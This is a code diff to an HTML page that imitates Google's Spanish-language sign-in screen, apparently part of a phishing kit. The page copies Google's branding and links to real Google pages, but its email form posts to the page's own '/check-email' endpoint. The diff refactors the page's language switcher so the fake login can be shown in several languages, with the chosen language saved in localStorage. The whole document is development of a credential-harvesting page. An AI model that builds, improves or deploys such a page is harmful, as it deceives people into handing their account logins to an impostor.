@@ -205,40 +205,32 @@
 </head>
 <body>
     <div class="header">
-        <a href="https://accounts.google.com/signup" target="_blank">Crear cuenta</a>
+        <a href="https://accounts.google.com/signup" target="_blank" data-translate="create_account">Crear cuenta</a>
         <a href="https://mail.google.com" target="_blank">Gmail</a>
         <a href="https://images.google.com" target="_blank">Imágenes</a>
     </div>
     
     <div class="main-container">
         <div class="form-card">
-            <h1 class="title">Iniciar sesión</h1>
-            <p class="subtitle">Utiliza tu cuenta de Google</p>
+            <h1 class="title" data-translate="sign_in">Iniciar sesión</h1>
+            <p class="subtitle" data-translate="use_account">Utiliza tu cuenta de Google</p>
             
             <form action="/check-email" method="post">
                 <div class="input-container">
-                    <input type="email" class="google-input" name="email" placeholder="Correo electrónico o teléfono" required autofocus>
+                    <input type="email" class="google-input" name="email" placeholder="Correo electrónico o teléfono" required autofocus data-translate-placeholder="email_placeholder">
                 </div>
                 
-                <a href="https://accounts.google.com/signin/recovery" class="forgot-link" target="_blank">
-                    ¿Has olvidado tu correo electrónico?
-                </a>
+                <a href="https://accounts.google.com/signin/recovery" class="forgot-link" target="_blank" data-translate="forgot_email">¿Has olvidado tu correo electrónico?</a>
                 
                 <div class="info-text">
-                    ¿No es tu ordenador? Usa el modo de invitado para iniciar sesión de forma privada.
+                    <span data-translate="guest_mode">¿No es tu ordenador? Usa el modo de invitado para iniciar sesión de forma privada.</span>
                     <br>
-                    <a href="https://support.google.com/chrome/answer/6130773" target="_blank">
-                        Más información
-                    </a>
+                    <a href="https://support.google.com/chrome/answer/6130773" target="_blank" data-translate="learn_more">Más información</a>
                 </div>
                 
                 <div class="button-group">
-                    <a href="https://accounts.google.com/signup" class="create-account" target="_blank">
-                        Crear cuenta
-                    </a>
-                    <button type="submit" class="next-button">
-                        Siguiente
-                    </button>
+                    <a href="https://accounts.google.com/signup" class="create-account" target="_blank" data-translate="create_account">Crear cuenta</a>
+                    <button type="submit" class="next-button" data-translate="next">Siguiente</button>
                 </div>
             </form>
         </div>
@@ -315,32 +307,45 @@
             }
         };
         
-        document.getElementById('languageSelect').addEventListener('change', function() {
-            const lang = this.value;
+        function updateTranslations(lang) {
             const langData = translations[lang] || translations['es'];
             
-            // Обновляем тексты
-            document.querySelector('.title').textContent = langData.sign_in;
-            document.querySelector('.subtitle').textContent = langData.use_account;
-            document.querySelector('.google-input').placeholder = langData.email_placeholder;
-            document.querySelector('.forgot-link').textContent = langData.forgot_email;
-            
-            const infoText = document.querySelector('.info-text');
-            const textNodes = infoText.childNodes;
-            if (textNodes[0] && textNodes[0].nodeType === Node.TEXT_NODE) {
-                textNodes[0].textContent = langData.guest_mode + ' ';
-            }
-            
-            const link = infoText.querySelector('a');
-            if (link) link.textContent = langData.learn_more;
-            
-            const createAccount = document.querySelector('.create-account');
-            if (createAccount) createAccount.textContent = langData.create_account;
-            
-            const nextButton = document.querySelector('.next-button');
-            if (nextButton) nextButton.textContent = langData.next;
-            
+            // Update page title
             document.title = langData.title;
+            
+            // Update all elements with data-translate
+            document.querySelectorAll('[data-translate]').forEach(element => {
+                const key = element.getAttribute('data-translate');
+                if (langData[key]) {
+                    element.textContent = langData[key];
+                }
+            });
+            
+            // Update placeholders
+            document.querySelectorAll('[data-translate-placeholder]').forEach(element => {
+                const key = element.getAttribute('data-translate-placeholder');
+                if (langData[key]) {
+                    element.placeholder = langData[key];
+                }
+            });
+            
+            // Save language preference
+            localStorage.setItem('selectedLanguage', lang);
+        }
+        
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            const languageSelect = document.getElementById('languageSelect');
+            const savedLang = localStorage.getItem('selectedLanguage') || 'es';
+            
+            // Set saved language
+            languageSelect.value = savedLang;
+            updateTranslations(savedLang);
+            
+            // Listen for language changes
+            languageSelect.addEventListener('change', function() {
+                updateTranslations(this.value);
+            });
         });
     </script>
 </body>
